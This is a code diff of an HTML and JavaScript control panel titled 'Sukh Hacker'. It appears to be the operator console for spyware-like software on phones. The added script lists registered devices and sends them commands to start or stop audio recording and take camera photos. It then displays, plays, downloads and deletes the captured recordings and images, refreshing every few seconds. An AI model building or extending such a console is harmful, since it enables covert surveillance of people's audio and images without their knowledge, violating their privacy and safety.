@@ -1,436 +1,8 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🚀 Multi-Device Control Panel</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 50%, #16213e 100%);
-            color: #ffffff;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
-        .header {
-            text-align: center;
-            padding: 30px 0;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 20px;
-            margin-bottom: 30px;
-            border: 1px solid #333;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-
-        .header h1 {
-            font-size: 2.5rem;
-            background: linear-gradient(45deg, #00ff88, #00ccff);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 10px;
-            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
-        }
-
-        .header p {
-            color: #cccccc;
-            font-size: 1.1rem;
-        }
-
-        /* Tabs Styling */
-        .tabs {
-            display: flex;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 15px;
-            padding: 10px;
-            margin-bottom: 20px;
-            border: 1px solid #333;
-        }
-
-        .tab-btn {
-            flex: 1;
-            padding: 15px 20px;
-            background: transparent;
-            border: none;
-            color: #cccccc;
-            font-size: 16px;
-            cursor: pointer;
-            border-radius: 10px;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .tab-btn:hover {
-            background: rgba(255, 255, 255, 0.1);
-            color: #00ff88;
-        }
-
-        .tab-btn.active {
-            background: linear-gradient(45deg, #00ff88, #00ccff);
-            color: #000;
-            font-weight: bold;
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
-        }
-
-        .tab-content {
-            display: none;
-            background: rgba(0, 0, 0, 0.4);
-            border-radius: 15px;
-            padding: 25px;
-            border: 1px solid #333;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-        }
-
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Devices Grid */
-        .devices-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin: 20px 0;
-        }
-
-        .device-card {
-            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-            border-radius: 15px;
-            padding: 20px;
-            border: 1px solid #333;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .device-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.1), transparent);
-            transition: left 0.5s ease;
-        }
-
-        .device-card:hover::before {
-            left: 100%;
-        }
-
-        .device-card:hover {
-            transform: translateY(-5px);
-            border-color: #00ff88;
-            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
-        }
-
-        .device-card.recording {
-            border-color: #ff4444;
-            background: linear-gradient(135deg, #2a1e1e 0%, #3d2d2d 100%);
-        }
-
-        .device-icon {
-            font-size: 2rem;
-            margin-bottom: 10px;
-        }
-
-        .device-info h3 {
-            color: #00ff88;
-            margin-bottom: 10px;
-            font-size: 1.2rem;
-        }
-
-        .device-status {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin: 5px 0;
-        }
-
-        .status-dot {
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            background: #00ff88;
-        }
-
-        .status-dot.recording {
-            background: #ff4444;
-            animation: pulse 1.5s infinite;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-
-        /* Control Panel */
-        .control-panel {
-            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 20px 0;
-            border: 1px solid #333;
-        }
-
-        .panel-header {
-            display: flex;
-            align-items: center;
-            justify-content: between;
-            margin-bottom: 20px;
-        }
-
-        .back-btn {
-            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 10px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.3s ease;
-        }
-
-        .back-btn:hover {
-            transform: translateX(-5px);
-            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.3);
-        }
-
-        .current-device {
-            flex: 1;
-            text-align: center;
-        }
-
-        .current-device h3 {
-            color: #00ccff;
-            font-size: 1.4rem;
-        }
-
-        /* Buttons */
-        .btn-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 15px;
-            justify-content: center;
-            margin: 20px 0;
-        }
-
-        .btn {
-            padding: 15px 25px;
-            border: none;
-            border-radius: 12px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: bold;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            min-width: 200px;
-            justify-content: center;
-        }
-
-        .btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
-        }
-
-        .btn:active {
-            transform: translateY(-1px);
-        }
-
-        .btn-start {
-            background: linear-gradient(45deg, #00ff88, #00cc88);
-            color: #000;
-        }
-
-        .btn-stop {
-            background: linear-gradient(45deg, #ff4444, #cc0000);
-            color: white;
-        }
-
-        .btn-camera {
-            background: linear-gradient(45deg, #00ccff, #0099cc);
-            color: white;
-        }
-
-        .btn-refresh {
-            background: linear-gradient(45deg, #ffaa00, #ff8800);
-            color: white;
-        }
-
-        /* Status Box */
-        .status-box {
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 12px;
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 4px solid #00ff88;
-        }
-
-        .status-box h4 {
-            color: #00ff88;
-            margin-bottom: 10px;
-        }
-
-        /* Files Section */
-        .files-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 20px;
-            margin: 20px 0;
-        }
-
-        .file-card {
-            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
-            border-radius: 12px;
-            padding: 20px;
-            border: 1px solid #333;
-        }
-
-        .file-header {
-            display: flex;
-            justify-content: between;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-
-        .file-type {
-            font-size: 1.5rem;
-        }
-
-        .file-info {
-            margin: 10px 0;
-        }
-
-        .file-info div {
-            margin: 5px 0;
-            color: #cccccc;
-        }
-
-        .file-actions {
-            display: flex;
-            gap: 10px;
-            margin-top: 15px;
-        }
-
-        .file-actions .btn {
-            min-width: auto;
-            padding: 10px 15px;
-            font-size: 14px;
-        }
-
-        /* Audio Player */
-        .audio-player {
-            width: 100%;
-            margin: 15px 0;
-            border-radius: 25px;
-            background: #333;
-        }
-
-        /* Photo Preview */
-        .photo-preview {
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .photo-preview img {
-            max-width: 100%;
-            border-radius: 12px;
-            border: 2px solid #00ff88;
-            box-shadow: 0 10px 25px rgba(0, 255, 136, 0.2);
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            padding: 20px;
-            color: #888;
-            font-size: 14px;
-            border-top: 1px solid #333;
-        }
-
-        .server-info {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-top: 10px;
-        }
-
-        /* Responsive */
-        @media (max-width: 768px) {
-            .devices-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .btn-group {
-                flex-direction: column;
-            }
-            
-            .btn {
-                min-width: 100%;
-            }
-            
-            .tabs {
-                flex-direction: column;
-            }
-        }
-
-        /* Scrollbar */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        ::-webkit-scrollbar-track {
-            background: #1a1a1a;
-        }
-
-        ::-webkit-scrollbar-thumb {
-            background: linear-gradient(45deg, #00ff88, #00ccff);
-            border-radius: 4px;
-        }
-
-        ::-webkit-scrollbar-thumb:hover {
-            background: linear-gradient(45deg, #00cc88, #0099cc);
-        }
-
-        /* Loading Animation */
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #333;
-            border-radius: 50%;
-            border-top-color: #00ff88;
-            animation: spin 1s ease-in-out infinite;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-    </style>
+    <title>🚀 Sukh Hacker</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
@@ -509,6 +81,9 @@
 
             <div id="allDevicesList">
                 <h3 style="color: #00ccff; margin-bottom: 20px;">Connected Devices</h3>
+                <button class="btn btn-refresh" onclick="refreshDevices()" style="margin-bottom: 20px;">
+                    🔄 Refresh Devices
+                </button>
                 <div class="devices-grid" id="devicesGrid">
                     <div style="text-align: center; color: #888; padding: 40px;">
                         <div style="font-size: 3rem; margin-bottom: 20px;">📱</div>
@@ -603,9 +178,6 @@
     </div>
 
     <script>
-        // Your existing JavaScript code remains the same
-        // Only CSS has been updated for black theme
-        
         let currentDeviceId = null;
 
         function openTab(tabName) {
@@ -637,14 +209,407 @@
             document.getElementById('allDevicesList').style.display = 'none';
             document.getElementById('deviceControlPanel').style.display = 'block';
             
-            document.getElementById('currentDeviceName').textContent = `Device: ${deviceId.substring(0, 12)}...`;
+            document.getElementById('currentDeviceName').textContent = `Device: ${deviceId}`;
             loadDeviceDetails(deviceId);
             refreshDeviceFiles();
         }
 
-        // ... rest of your existing JavaScript functions remain exactly the same
-        // Only CSS has been updated
+        function loadDeviceDetails(deviceId) {
+            fetch(`/get_device/${deviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        const device = data.device;
+                        const status = device.recording ? '🔴 RECORDING' : '🟢 IDLE';
+                        document.getElementById('currentDeviceStatus').innerHTML = `
+                            <strong>Status:</strong> ${status}<br>
+                            <strong>Files:</strong> ${data.files_count} | 
+                            <strong>Photos:</strong> ${data.photos_count} | 
+                            <strong>Audios:</strong> ${data.audios_count}
+                        `;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading device details:', error);
+                });
+        }
 
+        function refreshDevices() {
+            console.log("Refreshing devices...");
+            fetch('/get_devices')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log("Devices data received:", data);
+                    const devicesGrid = document.getElementById('devicesGrid');
+                    
+                    if (data.devices && Object.keys(data.devices).length > 0) {
+                        let devicesHtml = '';
+                        
+                        for (let device_id in data.devices) {
+                            const device = data.devices[device_id];
+                            const status = device.recording ? 'RECORDING' : 'IDLE';
+                            const statusClass = device.recording ? 'recording' : 'idle';
+                            const lastSeen = new Date(device.last_seen * 1000).toLocaleTimeString();
+                            const deviceShortId = device_id.length > 20 ? device_id.substring(0, 20) + '...' : device_id;
+                            
+                            devicesHtml += `
+                                <div class="device-card ${statusClass}" onclick="showDeviceControl('${device_id}')">
+                                    <div class="device-icon">
+                                        ${device.recording ? '🔴' : '🟢'}
+                                    </div>
+                                    <div class="device-info">
+                                        <h3>${deviceShortId}</h3>
+                                        <div class="device-status">
+                                            <div class="status-dot ${device.recording ? 'recording' : ''}"></div>
+                                            <span>${status}</span>
+                                        </div>
+                                        <div class="device-status">
+                                            <span>Last Seen: ${lastSeen}</span>
+                                        </div>
+                                        <div class="device-status">
+                                            <span>Recording: ${device.recording ? 'Yes' : 'No'}</span>
+                                        </div>
+                                    </div>
+                                </div>`;
+                        }
+                        
+                        devicesGrid.innerHTML = devicesHtml;
+                    } else {
+                        devicesGrid.innerHTML = `
+                            <div style="text-align: center; color: #888; padding: 40px; width: 100%;">
+                                <div style="font-size: 3rem; margin-bottom: 20px;">📱</div>
+                                <h3>No devices connected</h3>
+                                <p>Waiting for devices to register...</p>
+                            </div>`;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error loading devices:', error);
+                    const devicesGrid = document.getElementById('devicesGrid');
+                    devicesGrid.innerHTML = `
+                        <div style="text-align: center; color: #ff4444; padding: 40px; width: 100%;">
+                            <div style="font-size: 3rem; margin-bottom: 20px;">❌</div>
+                            <h3>Error loading devices</h3>
+                            <p>${error.message}</p>
+                        </div>`;
+                });
+        }
+
+        function sendDeviceCommand(command) {
+            if (!currentDeviceId) {
+                alert('No device selected');
+                return;
+            }
+
+            const statusElement = document.getElementById('deviceCommandStatus');
+            statusElement.innerHTML = `<span class="loading"></span> Sending command: ${command}...`;
+
+            fetch('/send_command_to_device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    command: command,
+                    device_id: currentDeviceId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'command_sent') {
+                    statusElement.innerHTML = `✅ Command sent: ${command} to device`;
+                    setTimeout(() => loadDeviceDetails(currentDeviceId), 1000);
+                    setTimeout(() => refreshDevices(), 1000);
+                } else {
+                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                }
+            })
+            .catch(error => {
+                statusElement.innerHTML = `❌ Network error: ${error}`;
+            });
+        }
+
+        function sendDeviceCameraCommand(command) {
+            if (!currentDeviceId) {
+                alert('No device selected');
+                return;
+            }
+
+            const statusElement = document.getElementById('deviceCommandStatus');
+            statusElement.innerHTML = `<span class="loading"></span> Sending camera command: ${command}...`;
+
+            fetch('/send_command_to_device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    command: command,
+                    device_id: currentDeviceId
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'command_sent') {
+                    statusElement.innerHTML = `✅ Camera command sent: ${command}`;
+                } else {
+                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                }
+            })
+            .catch(error => {
+                statusElement.innerHTML = `❌ Network error: ${error}`;
+            });
+        }
+
+        function refreshDeviceFiles() {
+            if (!currentDeviceId) return;
+
+            fetch(`/get_device_files/${currentDeviceId}`)
+                .then(response => response.json())
+                .then(data => {
+                    let filesHtml = '';
+                    
+                    if (data.files && data.files.length > 0) {
+                        data.files.forEach(file => {
+                            const fileUrl = '/file/' + file.filename;
+                            const fileSizeKB = (file.size / 1024).toFixed(2);
+                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
+                            
+                            if (file.type === 'photo') {
+                                filesHtml += `
+                                    <div class="file-card">
+                                        <div class="file-header">
+                                            <div class="file-type">📷</div>
+                                        </div>
+                                        <div class="file-info">
+                                            <div><strong>File:</strong> ${file.filename}</div>
+                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                        </div>
+                                        <div class="file-actions">
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
+                                            <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                        </div>
+                                    </div>`;
+                            } else {
+                                filesHtml += `
+                                    <div class="file-card">
+                                        <div class="file-header">
+                                            <div class="file-type">🎵</div>
+                                        </div>
+                                        <div class="file-info">
+                                            <div><strong>File:</strong> ${file.filename}</div>
+                                            <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                            <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                        </div>
+                                        <audio controls class="audio-player">
+                                            <source src="${fileUrl}" type="audio/3gpp">
+                                        </audio>
+                                        <div class="file-actions">
+                                            <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
+                                            <button class="btn btn-refresh" onclick="playFile('${file.filename}')">▶️ Play</button>
+                                        </div>
+                                    </div>`;
+                            }
+                        });
+                    } else {
+                        filesHtml = '<div style="text-align: center; color: #888; padding: 20px;">No files found for this device</div>';
+                    }
+                    
+                    document.getElementById('deviceFilesList').innerHTML = filesHtml;
+                })
+                .catch(error => {
+                    document.getElementById('deviceFilesList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading device files</div>';
+                });
+        }
+
+        function sendCommand(command) {
+            const statusElement = document.getElementById('globalStatus');
+            statusElement.innerHTML = `<span class="loading"></span> Sending command: ${command}...`;
+            
+            fetch('/send_command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: command })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'command_sent') {
+                    statusElement.innerHTML = `✅ Command sent: ${command} | Devices: ${data.devices_count}`;
+                    setTimeout(() => refreshDevices(), 1000);
+                } else {
+                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                }
+            })
+            .catch(error => {
+                statusElement.innerHTML = `❌ Network error: ${error}`;
+            });
+        }
+
+        function sendCameraCommand(command) {
+            const statusElement = document.getElementById('globalStatus');
+            statusElement.innerHTML = `<span class="loading"></span> Sending camera command: ${command}...`;
+            
+            fetch('/camera', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    command: command,
+                    action: 'control'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    statusElement.innerHTML = `✅ Camera command sent: ${command}`;
+                    setTimeout(() => refreshDevices(), 1000);
+                } else {
+                    statusElement.innerHTML = `❌ Error: ${data.message || 'Unknown error'}`;
+                }
+            })
+            .catch(error => {
+                statusElement.innerHTML = `❌ Network error: ${error}`;
+            });
+        }
+
+        function refreshFiles() {
+            fetch('/get_files')
+                .then(response => response.json())
+                .then(data => {
+                    let filesHtml = '';
+                    const audioFiles = data.files.filter(file => file.type !== 'photo');
+                    if (audioFiles.length > 0) {
+                        document.getElementById('filesCount').textContent = audioFiles.length + ' files';
+                        audioFiles.forEach(file => {
+                            const fileUrl = '/file/' + file.filename;
+                            const fileSizeKB = (file.size / 1024).toFixed(2);
+                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
+                            
+                            filesHtml += `
+                                <div class="file-card">
+                                    <div class="file-header">
+                                        <div class="file-type">🎵</div>
+                                    </div>
+                                    <div class="file-info">
+                                        <div><strong>File:</strong> ${file.filename}</div>
+                                        <div><strong>Device:</strong> ${file.device_id}</div>
+                                        <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                        <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                    </div>
+                                    <audio controls class="audio-player">
+                                        <source src="${fileUrl}" type="audio/3gpp">
+                                    </audio>
+                                    <div class="file-actions">
+                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
+                                        <button class="btn btn-refresh" onclick="playFile('${file.filename}')">▶️ Play</button>
+                                    </div>
+                                </div>`;
+                        });
+                    } else {
+                        filesHtml = '<div style="text-align: center; color: #888; padding: 40px; width: 100%;"><div style="font-size: 3rem; margin-bottom: 20px;">🎵</div><h3>No recordings found</h3><p>Recordings will appear here when devices upload audio files</p></div>';
+                        document.getElementById('filesCount').textContent = '0 files';
+                    }
+                    document.getElementById('filesList').innerHTML = filesHtml;
+                })
+                .catch(error => {
+                    document.getElementById('filesList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading files</div>';
+                });
+        }
+
+        function refreshPhotos() {
+            fetch('/get_files')
+                .then(response => response.json())
+                .then(data => {
+                    let photosHtml = '';
+                    const photoFiles = data.files.filter(file => file.type === 'photo');
+                    if (photoFiles.length > 0) {
+                        document.getElementById('photosCount').textContent = photoFiles.length + ' photos';
+                        photoFiles.forEach(file => {
+                            const fileUrl = '/file/' + file.filename;
+                            const fileSizeKB = (file.size / 1024).toFixed(2);
+                            const uploadDate = new Date(file.upload_time * 1000).toLocaleString();
+                            
+                            photosHtml += `
+                                <div class="file-card">
+                                    <div class="file-header">
+                                        <div class="file-type">📷</div>
+                                    </div>
+                                    <div class="file-info">
+                                        <div><strong>File:</strong> ${file.filename}</div>
+                                        <div><strong>Device:</strong> ${file.device_id}</div>
+                                        <div><strong>Size:</strong> ${fileSizeKB} KB</div>
+                                        <div><strong>Uploaded:</strong> ${uploadDate}</div>
+                                    </div>
+                                    <div style="text-align: center; margin: 15px 0;">
+                                        <img src="${fileUrl}" alt="${file.filename}" style="max-width: 100%; border-radius: 10px; border: 2px solid #00ff88;">
+                                    </div>
+                                    <div class="file-actions">
+                                        <button class="btn btn-camera" onclick="downloadFile('${file.filename}')">📥 Download</button>
+                                        <button class="btn btn-stop" onclick="deleteFile('${file.filename}')">🗑️ Delete</button>
+                                    </div>
+                                </div>`;
+                        });
+                    } else {
+                        photosHtml = '<div style="text-align: center; color: #888; padding: 40px; width: 100%;"><div style="font-size: 3rem; margin-bottom: 20px;">📸</div><h3>No photos found</h3><p>Photos will appear here when devices capture and upload images</p></div>';
+                        document.getElementById('photosCount').textContent = '0 photos';
+                    }
+                    document.getElementById('photosList').innerHTML = photosHtml;
+                })
+                .catch(error => {
+                    document.getElementById('photosList').innerHTML = '<div style="color: #ff4444; text-align: center;">Error loading photos</div>';
+                });
+        }
+
+        function downloadFile(filename) {
+            window.open('/file/' + filename, '_blank');
+        }
+
+        function playFile(filename) {
+            const audioElement = document.querySelector(`audio[src="/file/${filename}"]`);
+            if (audioElement) {
+                audioElement.play().catch(e => {
+                    console.error('Play error:', e);
+                });
+            }
+        }
+
+        function deleteFile(filename) {
+            if (confirm('Are you sure you want to delete ' + filename + '?')) {
+                fetch('/delete_file/' + filename, { method: 'DELETE' })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.status === 'success') {
+                            refreshPhotos();
+                            refreshFiles();
+                            if (currentDeviceId) {
+                                refreshDeviceFiles();
+                            }
+                        } else {
+                            alert('Delete failed: ' + data.message);
+                        }
+                    })
+                    .catch(error => {
+                        alert('Delete error: ' + error);
+                    });
+            }
+        }
+
+        function updateTime() {
+            document.getElementById('serverTime').textContent = new Date().toLocaleString();
+        }
+
+        // Auto refresh
+        setInterval(refreshDevices, 3000);
+        setInterval(refreshFiles, 5000);
+        setInterval(refreshPhotos, 5000);
+        setInterval(updateTime, 1000);
+        
+        // Initial load
+        refreshDevices();
+        refreshFiles();
+        refreshPhotos();
+        updateTime();
     </script>
 </body>
 </html>
